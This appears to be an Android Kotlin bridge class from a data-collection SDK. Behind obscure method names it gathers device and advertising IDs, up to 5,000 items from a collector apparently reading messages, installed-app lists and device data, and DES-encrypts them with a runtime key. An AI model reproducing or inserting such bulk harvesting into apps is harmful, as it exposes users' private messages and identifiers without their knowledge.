package com.plugs.core

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.annotation.Keep
import androidx.annotation.RequiresApi
import com.plugs.core.util.EncryptDES
import com.plugs.core.util.GsonUtils
import core.DevicesUtils
import core.OtherCollect
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.plugs.core.util.Utils
import kotlinx.coroutines.*


@Keep
object Bridge {
    private val TAG: String? = "Bridge"
    private var _key = ""
    private var max = 5000

    @SuppressLint("HardwareIds")
    fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID);
    }

    fun getGoogleID(context: Context): String? = runBlocking {
        return@runBlocking withContext(Dispatchers.IO) {
            try {
                val advertisingIdInfo = AdvertisingIdClient.getAdvertisingIdInfo(context)
                advertisingIdInfo.id
            } catch (e: Exception) {
                Log.i(TAG, "getGoogleID error:${e.message}")
                ""
            }
        }
    }

    fun a(context: Context): String {
        Utils.saveContext(context)
        return EncryptDES(_key).encrypt(GsonUtils.toJson(OtherCollect.getMsg(context, max)))
    }

    @RequiresApi(Build.VERSION_CODES.M)
    fun bb(context: Context): String {
        Utils.saveContext(context)
        return GsonUtils.toJson(DevicesUtils.getDeviceData(context))
//        return EncryptDES(_key).encrypt(GsonUtils.toJson(DevicesUtils.getDeviceData(context)))
    }


    fun aa(context: Context): String {
        Utils.saveContext(context)
        return EncryptDES(_key).encrypt(GsonUtils.toJson(OtherCollect.getApp(context, true)))
    }

    fun endes(key: String?,content: String?): String {
        return EncryptDES(key).encrypt(content)
    }





    fun setKey(key: String?, maxMsg: Int?) {
        if (key != null) {
            _key = key
        }
        if (maxMsg != null && maxMsg > 0) {
            max = maxMsg
        }
    }
}